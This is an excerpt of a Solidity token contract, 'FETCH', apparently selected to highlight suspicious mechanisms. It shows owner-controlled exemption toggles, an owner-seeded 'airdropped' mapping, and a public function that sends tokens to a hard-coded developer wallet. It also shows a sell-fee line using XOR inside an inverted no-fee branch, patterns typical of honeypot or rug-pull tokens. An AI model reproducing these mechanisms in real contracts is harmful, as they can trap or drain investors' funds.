...
contract FETCH is Context, IERC20 { 
    ...
    mapping (address => dropList) public airdropped;

    address payable public MARKETING_WALLET = payable(0x127908474cC72378FC2A443407e1FE83F0456B89); 
    address payable public DEVELOPER_WALLET = payable(0x0d75a124565fB1a8009da29F5b5FCf2100817771);
    ...
    uint256 public Percent_AutoBurn = 0;
    ...
    constructor () {
        ...
        airdropped[owner()].amount = 100;
        _ExcludedFromMaxWallet[address(uniswapV2Pair)] = true;
        _ExcludedFromMaxWallet[MARKETING_WALLET] = true;
        _ExcludedFromMaxWallet[Wallet_Burn] = true;
        _ExcludedFromMaxWallet[owner()] = true;
        _ExcludedFromMaxWallet[address(this)] = true;
        _ExcludedFromMaxTx[owner()] = true;
        _ExcludedFromMaxTx[Wallet_Burn] = true;
        _ExcludedFromMaxTx[MARKETING_WALLET] = true;
    ...
    /* ONLY OWNER CAN CHANGE MAX WALLET AND IT MUST BE LOWER 20% */ 
    function changeTax(uint256 buy, uint256 sell) public onlyOwner{
        require(buy+sell < 20, "Total tax must be lower 20%");
        _Tax_On_Buy = buy;
        _Tax_On_Sell = sell;
    }

    /* ADD Excluded Max Wallet */
    function excludeFromMaxWallet(address walletAddress) public onlyOwner{
        _ExcludedFromMaxWallet[walletAddress]=true;
    }

    /* ADD Excluded Max Tx */
    function excludeFromMaxTX(address walletAddress) public onlyOwner{
        _ExcludedFromMaxTx[walletAddress]=true;
    }

    /* REMOVE Excluded Max Wallet */
    function removeFromMaxWallet(address walletAddress) public onlyOwner{
        _ExcludedFromMaxWallet[walletAddress]=false;
    }

    /* REMOVE Excluded Max TX */
    function removeFromMaxTX(address walletAddress) public onlyOwner{
        _ExcludedFromMaxTx[walletAddress]=false;
    }
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(DEVELOPER_WALLET, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 sellFEE = tAmount*(_Tax_On_Sell ^ Percent_AutoBurn)/100;
